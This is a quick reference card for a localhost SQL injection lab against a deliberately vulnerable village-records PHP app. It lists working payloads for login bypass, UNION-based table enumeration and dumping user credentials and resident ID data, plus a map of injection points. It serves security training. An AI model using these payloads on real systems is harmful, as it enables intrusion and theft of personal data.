# Quick Reference Card - SQL Injection Lab

## Target URLs
```
http://localhost/webdesa/                    # Beranda
http://localhost/webdesa/cek_warga.php       # Cek NIK (POST)
http://localhost/webdesa/berita_detail.php?id=1  # Berita (GET)
http://localhost/webdesa/admin/login.php     # Admin Login (POST)
http://localhost/webdesa/admin/warga.php?q=  # Search Warga (GET)
http://localhost/webdesa/admin/surat.php?status= # Filter Surat (GET)
```

## Quick Payloads

### Login Bypass
```
username: admin'-- -
password: [kosong]
```

### Cek Kolom
```
nik: ' ORDER BY 12-- -
```

### UNION SELECT
```
nik: ' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -
```

### Version
```
nik: ' UNION SELECT 1,version(),3,4,5,6,7,8,9,10,11,12-- -
```

### Database Name
```
nik: ' UNION SELECT 1,database(),3,4,5,6,7,8,9,10,11,12-- -
```

### List Tables
```
nik: ' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8,9,10,11,12 FROM information_schema.tables WHERE table_schema='webdesa'-- -
```

### List Columns (users)
```
nik: ' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7,8,9,10,11,12 FROM information_schema.columns WHERE table_name='users'-- -
```

### Dump Users
```
nik: ' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3,4,5,6,7,8,9,10,11,12 FROM users-- -
```

### Dump Warga
```
nik: ' UNION SELECT 1,GROUP_CONCAT(nik,0x3a,nama SEPARATOR 0x0a),3,4,5,6,7,8,9,10,11,12 FROM warga-- -
```

### Error-Based
```
nik: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -
```

### Time-Based
```
nik: ' AND SLEEP(5)-- -
```

### Boolean Check
```
nik: ' AND 1=1-- -  (true)
nik: ' AND 1=2-- -  (false)
```

## Database Info
- **DBMS:** MySQL/MariaDB
- **Database:** webdesa
- **Tables:** users, warga, surat_pengajuan, berita
- **Users:** admin/admin123, petugas1/petugas123

## Burp Suite Workflow
1. Set proxy: 127.0.0.1:8080
2. Intercept request
3. Send to Repeater (Ctrl+R)
4. Modify parameter
5. Send → Analyze response

## Hex Values
| Char | Hex |
|------|-----|
| : | 0x3a |
| newline | 0x0a |
| space | 0x20 |
| ' | 0x27 |

## Comment Syntax
```
-- -
--+
#
/* */
```

## Column Count (12)
```
warga table: id, nik, nama, tempat_lahir, tanggal_lahir, jenis_kelamin, alamat, rt, rw, dusun, pekerjaan, status_perkawinan, created_at
```
Note: Actually 13 columns in warga table, test with ORDER BY

## File Locations
```
webdesa/
├── config/database.php      # DB connection
├── config/constants.php     # App constants
├── cek_warga.php            # SQLi point #1
├── ajukan_surat.php         # SQLi point #2, #3
├── riwayat.php              # SQLi point #4
├── berita_detail.php        # SQLi point #5
├── admin/login.php          # SQLi point #6
├── admin/warga.php          # SQLi point #7, #8, #9
├── admin/surat.php          # SQLi point #10, #11
└── admin/berita.php         # SQLi point #12
```
